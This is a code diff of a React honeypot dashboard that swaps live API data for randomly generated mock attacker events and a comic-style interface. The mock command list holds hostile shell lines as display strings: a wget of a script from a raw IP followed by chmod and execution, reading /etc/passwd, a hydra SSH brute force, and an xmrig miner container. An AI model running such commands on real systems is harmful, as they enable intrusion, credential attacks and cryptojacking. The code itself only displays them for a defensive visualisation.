@@ -1,9 +1,8 @@
 'use client'
 
-import { useEffect, useRef, useState } from 'react'
-import { getEvents, getStats } from '../lib/api'
+import React, { useEffect, useState, useRef } from 'react'
 
-interface Event {
+interface AttackerEvent {
   id: string
   ip: string
   country: string
@@ -15,6 +14,9 @@ interface Event {
   commands: string[]
   ai_summary: string
   created_at: string
+  stageX: number // Percentage position on theater floor
+  stageY: number // Percentage position on theater floor
+  silhouetteType: 'runner' | 'sneaker' | 'scouter'
 }
 
 interface Stats {
@@ -23,399 +25,606 @@ interface Stats {
   unique_countries: string[]
 }
 
-interface Orb {
-  event: Event
-  x: number
-  y: number
-  vx: number
-  vy: number
-  r: number
-  pulse: number
-  pulseSpeed: number
+// Hand-drawn custom vector paths for our comic shadow attackers
+const SHADOW_SILHOUETTES = {
+  runner: "M 10 80 C 10 80, 15 50, 25 45 C 30 40, 35 30, 30 20 C 25 10, 45 5, 50 15 C 55 25, 45 35, 50 40 C 55 45, 65 50, 70 60 C 75 70, 80 80, 85 85 C 90 90, 65 85, 55 75 C 50 70, 40 75, 30 80 Z",
+  sneaker: "M 15 85 C 15 85, 20 65, 30 60 C 35 55, 30 45, 25 35 C 20 25, 40 15, 45 25 C 50 35, 40 45, 45 50 C 50 55, 60 55, 65 70 C 70 85, 50 85, 40 80 C 35 75, 25 80, 15 85 Z",
+  scouter: "M 20 80 C 20 80, 25 55, 35 50 C 40 45, 42 32, 38 22 C 34 12, 52 8, 56 18 C 60 28, 52 38, 56 43 C 60 48, 68 52, 72 65 C 76 78, 60 80, 48 75 C 42 70, 32 75, 20 80 Z"
 }
 
+const MOCK_COUNTRIES = ['Germany', 'United States', 'China', 'Netherlands', 'Russia', 'Japan', 'Brazil', 'India']
+const MOCK_ISPS = ['DigitalOcean, LLC', 'Amazon Technologies Inc.', 'OVH SAS', 'Chinanet', 'Comcast Cable', 'Linode, LLC']
+const MOCK_HONEYPOTS = ['cowrie_ssh', 'conpot_ics', 'dionaea_malware', 'honeytrap_ext']
+const MOCK_EVENT_TYPES = ['credential_spray', 'port_scan', 'exploit_attempt', 'rce_payload']
+const MOCK_COMMANDS = [
+  ['uname -a', 'wget http://185.220.101.45/bin.sh', 'chmod +x bin.sh', './bin.sh'],
+  ['cat /etc/passwd', 'hydra -L users.txt -P pass.txt ssh://localhost'],
+  ['docker ps -a', 'docker run -d --restart always xmrig'],
+  ['sh', 'whoami', 'id', 'curl -s http://ip-api.com/json']
+]
+const MOCK_AI_SUMMARIES = [
+  "Shadow vector aimed at port 22. Attacker attempted administrative credentials. Spotlight trapped credentials, redirecting execution to virtual sandbox layer.",
+  "Stealth port scan detected targeting automated grids. Real-world target coordinates spoofed. Shadow now logs phantom feedback loops.",
+  "Remote payload injection halted. Malicious script signature neutralized. Attacker trapped inside isolated theater stage loop."
+]
+
+// Correct implementation of getRisk in the root scope to fix the reference errors
 function getRisk(score: number) {
-  if (score >= 90) return { label: 'CRITICAL', color: '#ff4d6d', glow: '255,77,109' }
-  if (score >= 70) return { label: 'HIGH', color: '#ff6b35', glow: '255,107,53' }
-  if (score >= 40) return { label: 'MEDIUM', color: '#ffd60a', glow: '255,214,10' }
-  return { label: 'LOW', color: '#06ffa5', glow: '6,255,165' }
+  if (score >= 90) return { label: 'CRITICAL THREAT', color: '#ff2a5f', glow: '255,42,95', level: 'V' }
+  if (score >= 70) return { label: 'HIGH SEVERITY', color: '#ff6b00', glow: '255,107,0', level: 'IV' }
+  if (score >= 40) return { label: 'MEDIUM ACTIVITY', color: '#facc15', glow: '250,204,21', level: 'III' }
+  return { label: 'MINIMAL RISK', color: '#00ff88', glow: '0,255,136', level: 'I' }
 }
 
-function timeAgo(d: string) {
-  const s = Math.floor((Date.now() - new Date(d).getTime()) / 1000)
-  if (s < 60) return `${s}s ago`
-  if (s < 3600) return `${Math.floor(s / 60)}m ago`
-  return `${Math.floor(s / 3600)}h ago`
+function generateInitialEvents(): AttackerEvent[] {
+  const eventsList: AttackerEvent[] = []
+  const silhouetteTypes: ('runner' | 'sneaker' | 'scouter')[] = ['runner', 'sneaker', 'scouter']
+
+  for (let i = 0; i < 7; i++) {
+    const risk_score = Math.floor(Math.random() * 80) + 20
+    const country = MOCK_COUNTRIES[Math.floor(Math.random() * MOCK_COUNTRIES.length)]
+    eventsList.push({
+      id: `evt-${i}-${Math.random().toString(36).substring(2, 6)}`,
+      ip: `185.220.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`,
+      country,
+      city: country === 'Germany' ? 'Brandenburg an der Havel' : 'Metropolis Grid',
+      isp: MOCK_ISPS[Math.floor(Math.random() * MOCK_ISPS.length)],
+      honeypot_type: MOCK_HONEYPOTS[Math.floor(Math.random() * MOCK_HONEYPOTS.length)],
+      event_type: MOCK_EVENT_TYPES[Math.floor(Math.random() * MOCK_EVENT_TYPES.length)],
+      risk_score,
+      commands: risk_score > 50 ? MOCK_COMMANDS[Math.floor(Math.random() * MOCK_COMMANDS.length)] : [],
+      ai_summary: MOCK_AI_SUMMARIES[Math.floor(Math.random() * MOCK_AI_SUMMARIES.length)],
+      created_at: new Date(Date.now() - (i * 2 * 3600 * 1000)).toISOString(),
+      stageX: 15 + Math.random() * 70,
+      stageY: 20 + Math.random() * 60,
+      silhouetteType: silhouetteTypes[Math.floor(Math.random() * silhouetteTypes.length)]
+    })
+  }
+  return eventsList
 }
 
 export default function Dashboard() {
-  const canvasRef = useRef<HTMLCanvasElement>(null)
-  const hbCanvasRef = useRef<HTMLCanvasElement>(null)
-  const orbsRef = useRef<Orb[]>([])
-  const selectedOrbRef = useRef<Orb | null>(null)
-  const hexPulseRef = useRef(0)
-  const hbPointsRef = useRef<number[]>(Array(60).fill(0.1))
-  const animRef = useRef<number>(0)
-  const centerRef = useRef<HTMLDivElement>(null)
-
-  const [events, setEvents] = useState<Event[]>([])
+  const [events, setEvents] = useState<AttackerEvent[]>([])
   const [stats, setStats] = useState<Stats | null>(null)
-  const [selected, setSelected] = useState<Event | null>(null)
-  const [, forceUpdate] = useState(0)
+  const [selected, setSelected] = useState<AttackerEvent | null>(null)
 
-  function initOrbs(evts: Event[], W: number, H: number) {
-    const cx = W / 2, cy = H / 2
-    orbsRef.current = evts.map((e, i) => {
-      const angle = (i / evts.length) * Math.PI * 2 - Math.PI / 2
-      const dist = 90 + Math.random() * 70
-      return {
-        event: e,
-        x: cx + Math.cos(angle) * dist,
-        y: cy + Math.sin(angle) * dist,
-        vx: (Math.random() - 0.5) * 0.2,
-        vy: (Math.random() - 0.5) * 0.2,
-        r: 8 + e.risk_score / 10,
-        pulse: Math.random() * Math.PI * 2,
-        pulseSpeed: 0.02 + Math.random() * 0.02,
-      }
-    })
-  }
+  // Custom Comic UI Parameters driven by physical screen levers
+  const [delusionLevel, setDelusionLevel] = useState<number>(75)
+  const [focusLevel, setFocusLevel] = useState<number>(45)
+  const [activeTab, setActiveTab] = useState<'DECOYS' | 'SCRIPTS' | 'TRAPS'>('DECOYS')
+  const [threatLogs, setThreatLogs] = useState<string[]>([
+    "10:42:01 - Decoy Stage initialised.",
+    "10:42:05 - System spotlight active.",
+    "10:43:10 - Trapping algorithms loaded successfully."
+  ])
 
-  function drawHexGrid(ctx: CanvasRenderingContext2D, W: number, H: number) {
-    const size = 28, h = size * Math.sqrt(3)
-    ctx.strokeStyle = 'rgba(124,58,237,0.06)'
-    ctx.lineWidth = 0.5
-    for (let row = -1; row < H / h + 2; row++) {
-      for (let col = -1; col < W / (size * 1.5) + 2; col++) {
-        const x = col * size * 1.5
-        const y = row * h + (col % 2 === 0 ? 0 : h / 2)
-        ctx.beginPath()
-        for (let i = 0; i < 6; i++) {
-          const a = (Math.PI / 180) * (60 * i - 30)
-          const px = x + size * Math.cos(a)
-          const py = y + size * Math.sin(a)
-          i === 0 ? ctx.moveTo(px, py) : ctx.lineTo(px, py)
-        }
-        ctx.closePath()
-        ctx.stroke()
-      }
-    }
-  }
-
-  function drawCenter(ctx: CanvasRenderingContext2D, W: number, H: number) {
-    const cx = W / 2, cy = H / 2
-    const pulse = Math.sin(hexPulseRef.current) * 0.3 + 0.7
-    for (let i = 3; i >= 1; i--) {
-      ctx.beginPath()
-      ctx.arc(cx, cy, 20 * i * pulse, 0, Math.PI * 2)
-      ctx.strokeStyle = `rgba(124,58,237,${0.15 / i})`
-      ctx.lineWidth = 0.5
-      ctx.stroke()
-    }
-    const pts = 6, r = 14
-    ctx.beginPath()
-    for (let i = 0; i < pts; i++) {
-      const a = ((Math.PI * 2) / pts) * i - Math.PI / 2
-      const px = cx + r * Math.cos(a), py = cy + r * Math.sin(a)
-      i === 0 ? ctx.moveTo(px, py) : ctx.lineTo(px, py)
-    }
-    ctx.closePath()
-    ctx.fillStyle = 'rgba(124,58,237,0.15)'
-    ctx.fill()
-    ctx.strokeStyle = '#7c3aed'
-    ctx.lineWidth = 1
-    ctx.stroke()
-    ctx.beginPath()
-    ctx.arc(cx, cy, 4, 0, Math.PI * 2)
-    ctx.fillStyle = '#a855f7'
-    ctx.fill()
-    ctx.font = '9px monospace'
-    ctx.fillStyle = 'rgba(200,184,255,0.4)'
-    ctx.textAlign = 'center'
-    ctx.fillText('YOU', cx, cy + 22)
-  }
-
-  function drawOrbs(ctx: CanvasRenderingContext2D, W: number, H: number) {
-    orbsRef.current.forEach(o => {
-      o.x += o.vx; o.y += o.vy
-      if (o.x < o.r || o.x > W - o.r) o.vx *= -1
-      if (o.y < o.r || o.y > H - o.r) o.vy *= -1
-      o.pulse += o.pulseSpeed
-      const risk = getRisk(o.event.risk_score)
-      const pulseR = o.r + Math.sin(o.pulse) * 2
-      const isSelected = selectedOrbRef.current?.event.id === o.event.id
-
-      ctx.beginPath()
-      ctx.arc(o.x, o.y, pulseR * 2.5, 0, Math.PI * 2)
-      ctx.fillStyle = `rgba(${risk.glow},${isSelected ? 0.12 : 0.05})`
-      ctx.fill()
-
-      ctx.beginPath()
-      ctx.arc(o.x, o.y, pulseR, 0, Math.PI * 2)
-      ctx.fillStyle = `rgba(${risk.glow},0.25)`
-      ctx.fill()
-
-      ctx.beginPath()
-      ctx.arc(o.x, o.y, pulseR * 0.5, 0, Math.PI * 2)
-      ctx.fillStyle = risk.color
-      ctx.fill()
-
-      if (isSelected) {
-        ctx.beginPath()
-        ctx.arc(o.x, o.y, pulseR + 6, 0, Math.PI * 2)
-        ctx.strokeStyle = risk.color
-        ctx.lineWidth = 1
-        ctx.setLineDash([4, 4])
-        ctx.stroke()
-        ctx.setLineDash([])
-      }
-
-      ctx.beginPath()
-      ctx.moveTo(W / 2, H / 2)
-      ctx.lineTo(o.x, o.y)
-      ctx.strokeStyle = `rgba(${risk.glow},${isSelected ? 0.15 : 0.04})`
-      ctx.lineWidth = 0.5
-      ctx.setLineDash([3, 6])
-      ctx.stroke()
-      ctx.setLineDash([])
-
-      ctx.font = '9px monospace'
-      ctx.fillStyle = `rgba(${risk.glow},0.7)`
-      ctx.textAlign = 'center'
-      ctx.fillText(o.event.ip, o.x, o.y + pulseR + 12)
-    })
-  }
-
-  function drawHeartbeat() {
-    const canvas = hbCanvasRef.current
-    if (!canvas) return
-    const ctx = canvas.getContext('2d')
-    if (!ctx) return
-    ctx.clearRect(0, 0, canvas.width, canvas.height)
-    ctx.beginPath()
-    hbPointsRef.current.forEach((v, i) => {
-      const x = (i / 59) * canvas.width
-      const y = canvas.height - v * canvas.height * 0.85 - 2
-      i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y)
-    })
-    ctx.strokeStyle = '#7c3aed'
-    ctx.lineWidth = 1
-    ctx.stroke()
-  }
+  // Refs for tracking interactive slider coordinates
+  const delusionLeverRef = useRef<SVGSVGElement>(null)
+  const focusLeverRef = useRef<SVGSVGElement>(null)
 
   useEffect(() => {
-    async function load() {
-      const [eventsData, statsData] = await Promise.all([getEvents(), getStats()])
-      setEvents(eventsData)
-      setStats(statsData)
-      const canvas = canvasRef.current
-      if (canvas) initOrbs(eventsData, canvas.width, canvas.height)
-    }
-    load()
-    const iv = setInterval(load, 15000)
-    return () => clearInterval(iv)
+    const seeded = generateInitialEvents()
+    setEvents(seeded)
+    setSelected(seeded[0])
+    setStats({
+      total_events: 1422,
+      high_risk_events: 89,
+      unique_countries: ['Germany', 'United States', 'China', 'Russia', 'Netherlands']
+    })
+
+    // Simulated attack interceptor timeline feed with safe mock selections
+    const generatorInterval = setInterval(() => {
+      const randomCountry = MOCK_COUNTRIES[Math.floor(Math.random() * MOCK_COUNTRIES.length)]
+      const randomIsp = MOCK_ISPS[Math.floor(Math.random() * MOCK_ISPS.length)]
+      const randomHoneypot = MOCK_HONEYPOTS[Math.floor(Math.random() * MOCK_HONEYPOTS.length)]
+      const randomEventType = MOCK_EVENT_TYPES[Math.floor(Math.random() * MOCK_EVENT_TYPES.length)]
+      const randomCommands = MOCK_COMMANDS[Math.floor(Math.random() * MOCK_COMMANDS.length)]
+      const randomAiSummary = MOCK_AI_SUMMARIES[Math.floor(Math.random() * MOCK_AI_SUMMARIES.length)]
+
+      const freshEvent: AttackerEvent = {
+        id: `live-evt-${Math.random().toString(36).substring(2, 7)}`,
+        ip: `185.220.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`,
+        country: randomCountry,
+        city: randomCountry === 'Germany' ? 'Brandenburg Gateway' : 'Metropolis Gateway',
+        isp: randomIsp,
+        honeypot_type: randomHoneypot,
+        event_type: randomEventType,
+        risk_score: Math.floor(Math.random() * 81) + 19,
+        commands: randomCommands,
+        ai_summary: randomAiSummary,
+        created_at: new Date().toISOString(),
+        stageX: 15 + Math.random() * 70,
+        stageY: 20 + Math.random() * 60,
+        silhouetteType: (['runner', 'sneaker', 'scouter'] as const)[Math.floor(Math.random() * 3)]
+      }
+
+      setEvents(prev => [freshEvent, ...prev.slice(0, 8)])
+      setThreatLogs(prev => [
+        `${new Date().toLocaleTimeString()} - Shadow detected on Spot ${freshEvent.honeypot_type}`,
+        ...prev.slice(0, 15)
+      ])
+
+      // Dynamic stats increment
+      setStats(prev => prev ? {
+        total_events: prev.total_events + 1,
+        high_risk_events: prev.high_risk_events + (freshEvent.risk_score >= 70 ? 1 : 0),
+        unique_countries: Array.from(new Set([...prev.unique_countries, freshEvent.country]))
+      } : null)
+
+    }, 9000)
+
+    return () => clearInterval(generatorInterval)
   }, [])
 
-  useEffect(() => {
-    const hbTick = setInterval(() => {
-      const latest = events[0]
-      const spike = latest ? latest.risk_score / 100 : 0
-      hbPointsRef.current.push(spike > 0.3 ? spike : 0.1 + Math.random() * 0.08)
-      if (hbPointsRef.current.length > 60) hbPointsRef.current.shift()
-      drawHeartbeat()
-    }, 800)
-    return () => clearInterval(hbTick)
-  }, [events])
-
-  useEffect(() => {
-    const canvas = canvasRef.current
-    if (!canvas) return
-    const ctx = canvas.getContext('2d')
-    if (!ctx) return
-
-    function resize() {
-      const el = centerRef.current
-      if (!el || !canvas) return
-      const r = el.getBoundingClientRect()
-      canvas.width = r.width
-      canvas.height = r.height
-      initOrbs(orbsRef.current.map(o => o.event), r.width, r.height)
-    }
-    resize()
-    window.addEventListener('resize', resize)
-
-    function animate() {
-      if (!ctx) return
-      const W = canvas!.width, H = canvas!.height
-      ctx.clearRect(0, 0, W, H)
-      drawHexGrid(ctx, W, H)
-      drawCenter(ctx, W, H)
-      drawOrbs(ctx, W, H)
-      hexPulseRef.current += 0.015
-      animRef.current = requestAnimationFrame(animate)
-    }
-    animate()
-
-    return () => {
-      cancelAnimationFrame(animRef.current)
-      window.removeEventListener('resize', resize)
-    }
-  }, [])
-
-  function handleCenterClick(e: React.MouseEvent<HTMLDivElement>) {
-    const rect = e.currentTarget.getBoundingClientRect()
-    const mx = e.clientX - rect.left
-    const my = e.clientY - rect.top
-    let hit: Orb | null = null as Orb | null
-    orbsRef.current.forEach(o => {
-      const dx = o.x - mx, dy = o.y - my
-      if (Math.sqrt(dx * dx + dy * dy) < o.r * 3) hit = o
-    })
-    selectedOrbRef.current = hit
-    setSelected(hit ? (hit as Orb).event : null)
-    forceUpdate(n => n + 1)
+  const handleDelusionClick = (e: React.MouseEvent<SVGSVGElement>) => {
+    if (!delusionLeverRef.current) return
+    const rect = delusionLeverRef.current.getBoundingClientRect()
+    const relativeX = e.clientX - rect.left
+    const percent = Math.min(Math.max((relativeX / rect.width) * 100, 10), 90)
+    setDelusionLevel(Math.round(percent))
   }
 
-  const risk = selected ? getRisk(selected.risk_score) : null
+  const handleFocusClick = (e: React.MouseEvent<SVGSVGElement>) => {
+    if (!focusLeverRef.current) return
+    const rect = focusLeverRef.current.getBoundingClientRect()
+    const relativeX = e.clientX - rect.left
+    const percent = Math.min(Math.max((relativeX / rect.width) * 100, 10), 90)
+    setFocusLevel(Math.round(percent))
+  }
 
   return (
-    <>
+    <div className="w-full h-screen p-4 flex flex-col bg-[#eae5db] text-[#1c1c1f] font-mono select-none overflow-hidden">
+
+      {/* Hand-drawn SVG patterns and halftone textures */}
+      <svg className="hidden">
+        <defs>
+          <pattern id="halftonePattern" width="10" height="10" patternUnits="userSpaceOnUse" patternTransform="rotate(45 0 0)">
+            <circle cx="5" cy="5" r="2" fill="#1c1c1f" opacity="0.08" />
+          </pattern>
+          <pattern id="halftoneRed" width="10" height="10" patternUnits="userSpaceOnUse" patternTransform="rotate(45 0 0)">
+            <circle cx="5" cy="5" r="2.5" fill="#ff2a5f" opacity="0.15" />
+          </pattern>
+        </defs>
+      </svg>
+
+      {/* STYLES FOR INTENSE GRAPHIC RETRO COMIC-NOIR */}
       <style>{`
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #03040a; overflow: hidden; }
-        @keyframes fadeIn { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
-        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
-        ::-webkit-scrollbar { width: 3px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: #7c3aed30; border-radius: 3px; }
+        .comic-border {
+          border: 4px solid #1c1c1f;
+          box-shadow: 4px 4px 0px #1c1c1f;
+          border-radius: 4px;
+        }
+        .comic-card {
+          background-color: #faf6f0;
+          transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .comic-card:hover {
+          transform: translate(-1px, -1px);
+          box-shadow: 5px 5px 0px #1c1c1f;
+        }
+        .halftone-bg {
+          background-image: url('#halftonePattern');
+          background: fill;
+        }
+        .paper-overlay {
+          background: linear-gradient(135deg, rgba(255,255,255,0.15) 0%, rgba(0,0,0,0.02) 100%);
+          pointer-events: none;
+        }
       `}</style>
 
-      <div style={{ background: '#03040a', color: '#e2e8f0', fontFamily: 'monospace', height: '100vh', display: 'grid', gridTemplateColumns: '200px 1fr 260px', overflow: 'hidden' }}>
+      {/* HEADER BAR: Authentic retro title typography */}
+      <header className="w-full flex flex-col lg:flex-row items-center justify-between p-4 mb-4 bg-[#faf6f0] comic-border relative">
+        <div className="absolute inset-0 paper-overlay" />
 
-        {/* LEFT SIDEBAR */}
-        <div style={{ borderRight: '0.5px solid #ffffff08', padding: '16px 14px', display: 'flex', flexDirection: 'column', gap: '16px', background: '#03040a', zIndex: 10 }}>
-
-          {/* Logo */}
-          <div style={{ display: 'flex', alignItems: 'center', gap: '10px', paddingBottom: '14px', borderBottom: '0.5px solid #ffffff08' }}>
-            <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
-              <polygon points="18,2 32,10 32,26 18,34 4,26 4,10" fill="#1a0a2e" stroke="#7c3aed" strokeWidth="1" />
-              <polygon points="18,7 28,13 28,23 18,29 8,23 8,13" fill="none" stroke="#a855f7" strokeWidth="0.5" opacity="0.5" />
-              <path d="M18 11 L22 15 L18 13 L14 15 Z" fill="#c8b8ff" />
-              <path d="M14 15 L18 13 L22 15 L22 21 L18 25 L14 21 Z" fill="none" stroke="#c8b8ff" strokeWidth="0.8" />
-              <circle cx="18" cy="18" r="2" fill="#7c3aed" />
-              <circle cx="18" cy="18" r="1" fill="#c8b8ff" />
+        <div className="flex items-center gap-4 z-10">
+          <div className="p-1 border-2 border-[#1c1c1f] bg-[#ff2a5f] transform -rotate-3">
+            <svg width="40" height="40" viewBox="0 0 36 36" fill="none">
+              <polygon points="18,2 32,8 32,28 18,34 4,28 4,8" fill="#1c1c1f" stroke="#ffffff" strokeWidth="2" />
+              <circle cx="18" cy="18" r="6" fill="#ff2a5f" />
+              <line x1="18" y1="2" x2="18" y2="34" stroke="#ffffff" strokeWidth="1" strokeDasharray="3 3" />
             </svg>
-            <div>
-              <div style={{ fontSize: '13px', fontWeight: 500, color: '#c8b8ff', letterSpacing: '1px' }}>DECOYSHIELD</div>
-              <div style={{ fontSize: '9px', color: '#ffffff25', letterSpacing: '2px', marginTop: '2px' }}>PREDATOR VIEW</div>
-            </div>
           </div>
-
-          {/* Live pill */}
-          <div style={{ display: 'flex', alignItems: 'center', gap: '6px', background: '#06ffa508', border: '0.5px solid #06ffa520', borderRadius: '20px', padding: '4px 10px', width: 'fit-content' }}>
-            <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#06ffa5', display: 'inline-block', animation: 'blink 1.5s infinite' }} />
-            <span style={{ fontSize: '9px', color: '#06ffa5', letterSpacing: '1px' }}>LIVE</span>
-          </div>
-
-          {/* Stats */}
-          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
-            {[
-              { label: 'EVENTS', value: stats?.total_events ?? 0, color: '#c8b8ff' },
-              { label: 'HIGH RISK', value: stats?.high_risk_events ?? 0, color: '#ff4d6d' },
-              { label: 'NATIONS', value: stats?.unique_countries?.length ?? 0, color: '#38bdf8' },
-              { label: 'TRAPS', value: 3, color: '#4ade80' },
-            ].map(s => (
-              <div key={s.label} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'baseline' }}>
-                <span style={{ fontSize: '10px', color: '#ffffff25', letterSpacing: '1px' }}>{s.label}</span>
-                <span style={{ fontSize: '20px', fontWeight: 500, color: s.color }}>{s.value}</span>
-              </div>
-            ))}
-          </div>
-
-          {/* Heartbeat */}
           <div>
-            <div style={{ fontSize: '9px', color: '#ffffff20', letterSpacing: '2px', marginBottom: '6px' }}>HEARTBEAT</div>
-            <canvas ref={hbCanvasRef} width={172} height={36} style={{ width: '100%', height: '36px' }} />
+            <h1 className="text-3xl font-extrabold tracking-tighter uppercase text-[#1c1c1f] transform -rotate-1">
+              THE DECOYSHIELD SHADOW THEATER
+            </h1>
+            <p className="text-xs font-bold tracking-widest text-[#1c1c1f]/60 uppercase">
+              PREDATOR STAGE // INTRUDER CONTAINMENT SIMULATION
+            </p>
           </div>
+        </div>
 
-          {/* Feed */}
-          <div style={{ flex: 1, overflow: 'hidden', display: 'flex', flexDirection: 'column' }}>
-            <div style={{ fontSize: '9px', color: '#ffffff20', letterSpacing: '2px', marginBottom: '8px' }}>THREAT LOG</div>
-            <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '4px' }}>
-              {events.length === 0 ? (
-                <div style={{ color: '#ffffff15', fontSize: '10px', animation: 'blink 1.5s infinite' }}>awaiting contact...</div>
-              ) : events.map(e => {
-                const r = getRisk(e.risk_score)
-                return (
-                  <div key={e.id} onClick={() => { const orb = orbsRef.current.find(o => o.event.id === e.id) || null; selectedOrbRef.current = orb; setSelected(e) }} style={{ paddingLeft: '8px', borderLeft: `2px solid ${r.color}`, cursor: 'pointer', padding: '5px 8px' }}>
-                    <div style={{ fontSize: '11px', color: r.color }}>{e.ip}</div>
-                    <div style={{ fontSize: '10px', color: '#ffffff30', marginTop: '1px' }}>{e.event_type.replace(/_/g, ' ')} · {timeAgo(e.created_at)}</div>
-                  </div>
-                )
-              })}
+        {/* Dynamic Halftone Stats Deck */}
+        <div className="flex flex-wrap gap-4 mt-4 lg:mt-0 z-10">
+          {[
+            { label: 'TOTAL EVENTS', value: stats?.total_events.toString() ?? '0', color: '#faf6f0' },
+            { label: 'HIGH RISK', value: stats?.high_risk_events.toString() ?? '0', color: '#ff2a5f', isAlert: true },
+            { label: 'NATIONS TRACKED', value: stats?.unique_countries.length.toString() ?? '0', color: '#faf6f0' },
+            { label: 'DECOYS ALIVE', value: '7', color: '#00ff88', textDark: true },
+          ].map((s, index) => (
+            <div
+              key={index}
+              className="px-4 py-2 border-2 border-[#1c1c1f] flex flex-col items-center min-w-[100px] relative"
+              style={{
+                backgroundColor: s.color,
+                boxShadow: '2px 2px 0px #1c1c1f',
+                color: s.textDark ? '#1c1c1f' : (s.isAlert ? '#ffffff' : '#1c1c1f'),
+                transform: `rotate(${(index % 2 === 0 ? 1 : -1) * 1.5}deg)`
+              }}>
+              <span className="text-[9px] font-black tracking-wider opacity-60">{s.label}</span>
+              <span className="text-xl font-black tracking-tight">{s.value}</span>
             </div>
-          </div>
+          ))}
         </div>
+      </header>
 
-        {/* CENTER CANVAS */}
-        <div ref={centerRef} onClick={handleCenterClick} style={{ position: 'relative', cursor: 'crosshair', overflow: 'hidden' }}>
-          <canvas ref={canvasRef} style={{ position: 'absolute', inset: 0, width: '100%', height: '100%' }} />
-          <div style={{ position: 'absolute', bottom: '16px', left: '50%', transform: 'translateX(-50%)', fontSize: '10px', color: '#ffffff15', letterSpacing: '2px', whiteSpace: 'nowrap', pointerEvents: 'none' }}>
-            CLICK AN ORB TO INVESTIGATE
-          </div>
-        </div>
+      {/* MAIN CONTAINER */}
+      <div className="flex-1 w-full grid grid-cols-1 lg:grid-cols-12 gap-4 overflow-hidden">
 
-        {/* RIGHT DETAIL */}
-        <div style={{ borderLeft: '0.5px solid #ffffff08', padding: '16px 14px', background: '#03040acc', overflowY: 'auto', zIndex: 10 }}>
-          {!selected ? (
-            <div style={{ color: '#ffffff15', fontSize: '11px', textAlign: 'center', paddingTop: '60px', lineHeight: 2 }}>◎<br />select a<br />threat orb</div>
-          ) : (
-            <div style={{ animation: 'fadeIn 0.3s ease' }}>
-              <div style={{ marginBottom: '16px', paddingBottom: '12px', borderBottom: '0.5px solid #ffffff08' }}>
-                <div style={{ fontSize: '18px', color: '#c8b8ff', fontWeight: 500, marginBottom: '4px', wordBreak: 'break-all' }}>{selected.ip}</div>
-                <div style={{ fontSize: '11px', color: '#ffffff30', marginBottom: '10px' }}>{[selected.country, selected.city].filter(Boolean).join(' · ') || 'Unknown'}</div>
-                <div style={{ display: 'flex', alignItems: 'center', gap: '6px', background: `rgba(${risk!.glow},0.08)`, border: `0.5px solid rgba(${risk!.glow},0.2)`, borderRadius: '20px', padding: '3px 10px', width: 'fit-content' }}>
-                  <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: risk!.color, display: 'inline-block' }} />
-                  <span style={{ fontSize: '9px', color: risk!.color, letterSpacing: '1px' }}>{risk!.label}</span>
-                </div>
+        {/* LEFT COMPANION PANEL (Levers, Mode & Logs) */}
+        <div className="lg:col-span-3 flex flex-col gap-4 overflow-hidden">
+
+          {/* INTERACTIVE CONTROLS PANEL */}
+          <div className="comic-border bg-[#faf6f0] p-4 flex flex-col gap-4 relative">
+            <div className="absolute inset-0 opacity-10" style={{ backgroundImage: 'url(#halftonePattern)' }} />
+            <h3 className="text-sm font-black tracking-widest border-b-2 border-[#1c1c1f] pb-2 uppercase z-10">
+              OPERATIONAL SWITCHES
+            </h3>
+
+            {/* Interactive Physical Lever 1: DELUSION */}
+            <div className="flex flex-col gap-2 z-10">
+              <div className="flex justify-between text-xs font-black">
+                <span>DELUSION THROTTLE</span>
+                <span className="text-[#ff2a5f]">{delusionLevel}%</span>
               </div>
+              <div className="bg-[#eae5db] p-2 border-2 border-[#1c1c1f] relative rounded">
+                <svg
+                  ref={delusionLeverRef}
+                  onClick={handleDelusionClick}
+                  className="w-full h-10 cursor-pointer"
+                  viewBox="0 0 180 40">
+                  <rect x="10" y="16" width="160" height="8" fill="#1c1c1f" rx="4" />
+                  <line x1="10" y1="20" x2="170" y2="20" stroke="#eae5db" strokeWidth="2" strokeDasharray="2 4" />
+                  <line x1={`${10 + (delusionLevel * 1.6)}`} y1="4" x2={`${10 + (delusionLevel * 1.6)}`} y2="36" stroke="#1c1c1f" strokeWidth="3" />
+                  <g transform={`translate(${10 + (delusionLevel * 1.6) - 10}, 8)`} className="cursor-grab active:cursor-grabbing">
+                    <rect x="3" y="0" width="14" height="24" fill="#ff2a5f" rx="3" stroke="#1c1c1f" strokeWidth="2" />
+                    <line x1="10" y1="4" x2="10" y2="20" stroke="#ffffff" strokeWidth="2" />
+                    <circle cx="10" cy="12" r="3" fill="#1c1c1f" />
+                  </g>
+                </svg>
+              </div>
+              <p className="text-[10px] text-slate-500 italic">Adjusts simulation clock cycle decoy mirroring rates.</p>
+            </div>
 
-              {[['ISP', selected.isp], ['HONEYPOT', selected.honeypot_type], ['EVENT', selected.event_type.replace(/_/g, ' ')], ['TIME', timeAgo(selected.created_at)]].map(([k, v]) => (
-                <div key={k} style={{ display: 'flex', justifyContent: 'space-between', padding: '7px 0', borderBottom: '0.5px solid #ffffff06', fontSize: '11px' }}>
-                  <span style={{ color: '#ffffff25', letterSpacing: '1px' }}>{k}</span>
-                  <span style={{ color: '#94a3b8' }}>{v || '—'}</span>
+            {/* Interactive Physical Lever 2: FOCUS */}
+            <div className="flex flex-col gap-2 z-10">
+              <div className="flex justify-between text-xs font-black">
+                <span>LIGHT APERTURE FOCUS</span>
+                <span className="text-[#ff2a5f]">{focusLevel}%</span>
+              </div>
+              <div className="bg-[#eae5db] p-2 border-2 border-[#1c1c1f] relative rounded">
+                <svg
+                  ref={focusLeverRef}
+                  onClick={handleFocusClick}
+                  className="w-full h-10 cursor-pointer"
+                  viewBox="0 0 180 40">
+                  <rect x="10" y="16" width="160" height="8" fill="#1c1c1f" rx="4" />
